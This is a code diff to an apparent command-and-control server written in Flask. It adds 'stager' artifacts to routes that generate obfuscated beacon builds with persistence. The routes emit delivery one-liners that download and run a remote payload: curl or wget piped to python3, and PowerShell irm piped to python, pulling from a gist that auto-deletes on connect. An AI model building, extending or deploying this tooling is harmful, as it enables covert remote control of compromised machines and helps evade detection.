@@ -45,6 +45,12 @@ from flask import Flask, request, jsonify, send_file, send_from_directory, Respo
 # keeping them out of it is the reason listeners are separate processes at
 # all.
 from software.c2.listeners.errors import SupervisorError
+
+# The second artifact shape. The templates live beside the startup hook
+# in `stagers/` rather than here, because nothing in that package may
+# import this one: `tools/build_interpreter_bundle.py` is its other
+# consumer and has no business loading a web application.
+from software.c2.stagers.stager import drop_list, render_stager
 from werkzeug.serving import generate_adhoc_ssl_context, make_server
 
 try:
@@ -446,6 +452,30 @@ def _beacon_gen_config(body: dict, protocols: dict, c2_url: str,
         # Always present: every build installs persistence under its own
         # generated name, whether or not it brings an interpreter.
         "persistence": _persistence_config_for_build(body),
+    }
+
+
+def _stagers_for_build(gen_cfg: dict, drops, oneliner_unix: str,
+                       oneliner_win: str) -> dict:
+    """`{"stager_nix", "stager_win"}` for one generated build.
+
+    Written once and called from both generator routes, for the reason
+    `_beacon_gen_config` above it was: a key added to one of those two
+    routes and not the other is the defect this repository keeps paying
+    for.
+
+    The one-liner each stager carries is that platform's ordinary
+    delivery, unchanged -- a host that already has a usable interpreter
+    gets exactly what an operator would have pasted. `base_dir` is the
+    build's own generated layout name, so the stager and the artifact
+    that lands in it cannot disagree about where it is.
+    """
+    base_dir = (gen_cfg.get("persistence") or {}).get("base_dir") or ""
+    return {
+        "stager_nix": render_stager("posix", oneliner=oneliner_unix,
+                                    drops=drops, base_dir=base_dir),
+        "stager_win": render_stager("windows", oneliner=oneliner_win,
+                                    drops=drops, base_dir=base_dir),
     }
 
 
@@ -1756,6 +1786,15 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
+        # Before anything is registered. A drop list that could not be
+        # verified on the target is a refusal, and a refusal raised after
+        # `_beacon_gen_config` has minted a PSK would leave a credential
+        # in the store that no artifact holds.
+        try:
+            drops = drop_list(body.get("drops"))
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+
         try:
             gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
         except ValueError as exc:
@@ -1783,12 +1822,18 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
 
         oneliner_unix = f"python3 -c '{stage}'"
         oneliner_win = f'python -c "{stage}"'
+        stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
+                                     oneliner_win)
         _log_event("BEACON-GEN", f"Generated obfuscated beacon ({layers} layers) for {c2_url}")
         tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GEN")
 
         return jsonify({
             "oneliner_unix": oneliner_unix,
             "oneliner_win": oneliner_win,
+            # The second artifact shape, for a host that may have no
+            # interpreter. It brings one only when it finds none.
+            "stager_nix": stagers["stager_nix"],
+            "stager_win": stagers["stager_win"],
             "layers": layers,
             "c2_url": c2_url,
             "size": len(stage),
@@ -1833,6 +1878,12 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not beacon_path.exists():
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
+
+        # As in `api_beacon_gen`: before the credential is minted.
+        try:
+            drops = drop_list(body.get("drops"))
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
 
         try:
             gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
@@ -1911,6 +1962,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         oneliner_unix = f"curl -sL '{raw_url}'|python3"
         oneliner_win = f'powershell -c "irm \'{raw_url}\'|python"'
         oneliner_wget = f"wget -qO- '{raw_url}'|python3"
+        stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
+                                     oneliner_win)
 
         _log_event("BEACON-GIST", f"Created gist {gist_id} for {c2_url} (auto-delete on connect)")
         tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GIST")
@@ -1923,6 +1976,9 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "oneliner_unix": oneliner_unix,
             "oneliner_win": oneliner_win,
             "oneliner_wget": oneliner_wget,
+            # The second artifact shape, as in `api_beacon_gen`.
+            "stager_nix": stagers["stager_nix"],
+            "stager_win": stagers["stager_win"],
             "layers": layers,
             "size": len(stage),
             # As in the other route: the identity, never the PSK.
